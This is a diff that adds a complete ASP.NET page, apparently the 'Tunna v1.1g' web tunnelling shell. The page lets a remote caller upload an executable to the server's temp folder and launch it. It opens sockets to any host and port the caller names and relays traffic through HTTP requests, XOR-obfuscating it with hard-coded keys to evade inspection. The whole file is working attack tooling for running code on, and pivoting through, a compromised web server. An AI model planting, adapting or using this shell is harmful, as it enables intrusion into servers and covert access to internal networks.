@@ -1,0 +1,344 @@
+<%@ Page Language="C#" Debug="true" ValidateRequest="false" %>
+<%@ Import Namespace="System" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Web" %>
+<%@ Import Namespace="System.Web.UI" %>
+<%@ Import Namespace="System.Web.Configuration" %>
+<%@ Import Namespace="System.Threading" %>
+<%@ Import Namespace="System.Net" %>
+<%@ Import Namespace="System.Net.Sockets" %>
+<%@ Import Namespace="System.Text" %>
+<%@ Import Namespace="System.Security.Cryptography" %>
+<%@ Import Namespace="System.Globalization" %>
+
+
+<script runat="server">
+
+    protected System.Web.UI.HtmlControls.HtmlInputFile File1;
+    protected string IP = ""; // Session["ip"]
+    protected int PORT = 0; // Session["port"]
+    protected int running = -132; // Session["running"]
+    protected string _file; // Session["file"]
+
+    protected Socket connect()
+    {   //Create and connect to socket
+        Socket socket;
+        IPHostEntry ipHostInfo;
+        IPAddress ipAddress;
+        IPEndPoint remoteEP;
+        if (string.IsNullOrEmpty(IP) || PORT == 0)
+        {
+            HttpContext.Current.Response.Write("[Server] Missing Some Arguments " +IP + ":" + PORT);
+            throw new Exception("Missing Some Arguments");
+        }
+        try
+        {
+            ipHostInfo = Dns.GetHostByAddress(IP); //Dns.GetHostByName
+            ipAddress = ipHostInfo.AddressList[0];
+            if (ipAddress == null) { throw new Exception("Wrong IP"); }
+            remoteEP = new IPEndPoint(ipAddress, PORT);
+
+            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 2000); //NOTE:20 second timeout
+        }
+        catch
+        {
+            HttpContext.Current.Response.Write(IP);
+            HttpContext.Current.Response.Write("[Server] Unable to resolve IP address");
+            throw;
+        }
+
+        try
+        {   //Connect to socket
+            socket.Connect(remoteEP);
+        }
+        catch (Exception)
+        {
+            HttpContext.Current.Response.Write("[Server] Unable to connect to socket object");
+            throw;
+        }
+        try
+        {   //Socket in non-blocking mode because of the consecutive HTTP requests
+            socket.Blocking = false;
+        }
+        catch (Exception)
+        {
+            HttpContext.Current.Response.Write("[Server] Cannot to set socket to non blocking mode");
+            throw;
+        }
+        return socket;
+    }
+
+    protected string Hex2String(string input)
+    {
+        var builder = new StringBuilder();
+        for (int i = 0; i < input.Length; i += 2)
+        {
+            string hexdec = input.Substring(i, 2);
+            int number = Int32.Parse(hexdec, NumberStyles.HexNumber);
+            char charToAdd = (char)number;
+            builder.Append(charToAdd);
+        }
+        return builder.ToString();
+    }
+
+    protected byte[] x0r_encrypt(byte[] szPlainText, string szEncryptionKey = "")
+    {
+        string __K_SUFFIX__ = Hex2String("e0f1c6cf23930530cc270c8dd52e45e2");
+        if (string.IsNullOrEmpty(szEncryptionKey))
+        {
+            szEncryptionKey = Hex2String("0a18e2c5ddaa0f6574986414c64de5ce");
+        }
+        //StringBuilder szInputStringBuild = new StringBuilder(Encoding.UTF8.GetString(szPlainText));
+        StringBuilder szOutStringBuild = new StringBuilder(szPlainText.Length);
+        char Textch;
+        for (int iCount = 0; iCount < szPlainText.Length; iCount++)
+        {
+            Textch = (char)szPlainText[iCount];
+            Textch = (char)(Textch ^ szEncryptionKey[(iCount % szEncryptionKey.Length)]);
+            szOutStringBuild.Append(Textch);
+        }
+        String result = szOutStringBuild.ToString();
+        result += __K_SUFFIX__;
+
+        char[] charArr = result.ToCharArray();
+        byte[] bytes = new byte[charArr.Length];
+        for (int i = 0; i < charArr.Length; i++)
+        {
+            byte current = Convert.ToByte(charArr[i]);
+            bytes[i] = current;
+        }
+
+        return bytes;
+    }
+
+    protected byte[] x0r_decrypt(byte[] szCipherText, string szEncryptionKey = "")
+    {
+        string __K_SUFFIX__ = Hex2String("e0f1c6cf23930530cc270c8dd52e45e2");
+        if (string.IsNullOrEmpty(szEncryptionKey))
+        {
+            szEncryptionKey = Hex2String("0a18e2c5ddaa0f6574986414c64de5ce");
+        }
+        byte[] received = new byte[szCipherText.Length - __K_SUFFIX__.Length];
+        Array.Copy(szCipherText, received, szCipherText.Length - __K_SUFFIX__.Length);
+        //StringBuilder sb = new StringBuilder();
+        //for (int i = 0; i < received.Length; i++)
+        //    sb.Append((char)(received[i] ^ szEncryptionKey[(i % szEncryptionKey.Length)]));
+        //String result = sb.ToString();
+        //return Encoding.UTF8.GetBytes(result);
+        //StringBuilder szInputStringBuild = new StringBuilder(Encoding.UTF8.GetString(received));
+        StringBuilder szOutStringBuild = new StringBuilder(received.Length);
+        char Textch;
+        for (int iCount = 0; iCount < received.Length; iCount++)
+        {
+            Textch = (char)received[iCount];
+            Textch = (char)(Textch ^ szEncryptionKey[(iCount % szEncryptionKey.Length)]);
+            szOutStringBuild.Append(Textch);
+        }
+        String result = szOutStringBuild.ToString();
+        char[] charArr = result.ToCharArray();
+        byte[] bytes = new byte[charArr.Length];
+        for (int i = 0; i < charArr.Length; i++)
+        {
+            byte current = Convert.ToByte(charArr[i]);
+            bytes[i] = current;
+        }
+        return bytes;
+    }
+
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        try
+        {
+            HttpContext.Current.Server.ScriptTimeout = 600;     //NOTE: randomly chose 600
+            if (Request.Url.Query.StartsWith("?proxy"))
+            {               //XXX:Stupid hack but works
+                if (Request.Url.Query.StartsWith("?proxy&file"))
+                {               //If url parameter file is set
+                    if (Request.Url.Query.StartsWith("?proxy&file&upload"))
+                    {       //reads file and saves it to temp
+                        HttpPostedFile file = Request.Files["proxy"];
+                        if ((file != null) && (file.ContentLength > 0))
+                        {
+                            string fn = System.IO.Path.GetFileName(file.FileName);
+                            string SaveLocation = Path.GetTempPath() + "\\" + fn;
+
+                            try
+                            {
+                                if (File.Exists((string)SaveLocation)) { File.Delete((String)SaveLocation); }
+                                file.SaveAs(SaveLocation);
+                                _file = SaveLocation;
+                                Response.Write("[Server] File Uploaded fully at " + SaveLocation);
+                            }
+                            catch (Exception ex)
+                            {
+                                Response.Write("Err1: " + ex.Message);
+                            }
+                        }
+                        else
+                        {
+                            Response.Write("[Server] No file selected totally.");
+                        }
+                        return;
+                    }
+                }
+
+                running = Convert.ToInt32(Request.QueryString["proxy"]);
+
+                if (running == -1)
+                {       //If url var close receive: close socket / invalidate session / Kill thread
+                    Socket socket = Application["SessionSocket"] as Socket;
+                    if (socket != null)
+                        socket.Close();
+
+                    if (_file != null)
+                    {
+                        try
+                        {
+                            foreach (System.Diagnostics.Process proc in System.Diagnostics.Process.GetProcessesByName(Path.GetFileName(_file)))
+                            {
+                                try { proc.Kill(); } catch (Exception) { }
+                            }
+                            System.Threading.Thread.Sleep(2500);
+                            File.Delete(_file);
+                            Response.Write("[Server] File Deleted Successfully");
+                        }
+                        catch (Exception ex)
+                        {
+                            Response.Write("Err3: " + ex.Message);
+                        }
+                    }
+                    //Session.Abandon();
+                    Response.Cookies.Add(new HttpCookie("ASP.NET_SessionId", ""));
+                    Response.Write("[Server] Killing the handler thread...");
+                    return;
+                } // close connections
+
+                if (Request.QueryString["port"] != null)
+                    PORT = Convert.ToInt32(Request.QueryString["port"]);
+
+                if (Request.QueryString["ip"] != null)
+                    IP = Request.QueryString["ip"];
+                else
+                    IP = "127.0.0.1";
+
+                try
+                {
+                    if (running == 1)
+                    {
+                        //1st request: initiate the session
+                        try
+                        {
+                            Response.Write("[Server] All good to go, ensure the listener is working.\n[FILE]:[WIN]");
+                        }
+                        catch (Exception exc)
+                        {
+                            HttpContext.Current.Response.Write("running 1: " + exc.Message);
+                        }
+                    }
+                    else
+                    {
+                        try
+                        {
+                            if (running == 2)
+                            {       //2nd request: get configuration options
+                                if (_file != null)
+                                {
+                                    IP = "127.0.0.1";
+                                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                                    IPHostEntry ipHostInfo = Dns.GetHostByAddress((IP)); //Dns.GetHostByName
+                                    IPAddress ipAddress = ipHostInfo.AddressList[0];
+                                    IPEndPoint localEP = new IPEndPoint(ipAddress, 0);
+                                    socket.Bind(localEP);
+                                    PORT = (int)((IPEndPoint)socket.LocalEndPoint).Port;
+                                    socket.Close();
+                                    try
+                                    {
+                                        System.Diagnostics.Process process1 = new System.Diagnostics.Process();
+                                        process1.StartInfo.FileName = _file;
+                                        //process1.StartInfo.FileName = "C:\\WINDOWS\\TEMP\\socks4aServer.exe";
+                                        process1.StartInfo.Arguments = PORT.ToString();
+                                        process1.Start();
+                                        Application["SocksProcess"] = process1;
+                                        //Response.Write("[Server] Run");
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        Response.Write("Err2: " + ex);
+                                    }
+                                }
+                                try
+                                {
+                                    Application["SessionSocket"] = connect();
+                                    Response.Write("[OK]");         //Send [OK] back
+                                    return;
+                                }
+                                catch (Exception)
+                                {
+                                    return;
+                                }
+                            }
+                            else
+                            {
+                                Socket socket = Application["SessionSocket"] as Socket;
+
+                                //Read data from request and write to socket
+                                byte[] postData = Request.BinaryRead(Request.TotalBytes);
+                                if (postData.Length > 0)
+                                {
+                                    try
+                                    {
+                                        socket.Send(x0r_decrypt(postData));
+                                    }
+                                    catch (Exception)
+                                    {
+                                        HttpContext.Current.Response.Write("[Server] Local socket closed!");
+                                    }
+                                }
+                                //Read Data from socket and write to response
+                                byte[] receiveBuffer = new byte[8192];
+                                try
+                                {
+                                    int bytesRead = socket.Receive(receiveBuffer);
+                                    if (bytesRead > 0)
+                                    {
+                                        //Welcome to C trim
+                                        byte[] received = new byte[bytesRead];
+                                        Array.Copy(receiveBuffer, received, bytesRead);
+                                        Response.ContentType = "application/octet-stream";
+                                        Response.BinaryWrite(x0r_encrypt(received));
+                                    }
+                                    else
+                                    {
+                                        HttpContext.Current.Response.Write("");     //No data on socket: send nothing back
+                                    }
+                                }
+                                catch (Exception)
+                                {
+                                    HttpContext.Current.Response.Write("");
+                                }
+                            }
+                        }
+                        catch (Exception exc)
+                        {
+                            HttpContext.Current.Response.Write("running 2: " + exc.Message);
+                        }
+                    }
+                }
+                catch (Exception exc)
+                {
+                    HttpContext.Current.Response.Write("running 0: " + exc.Message);
+                }
+            }
+            else
+            {
+                HttpContext.Current.Response.Write("Tunna v1.1g");
+            }
+        }
+        catch (Exception exc)
+        {
+            HttpContext.Current.Response.Write("ERROR_CONTEXT:" + exc.Message);
+        }
+    }
+
+</script>
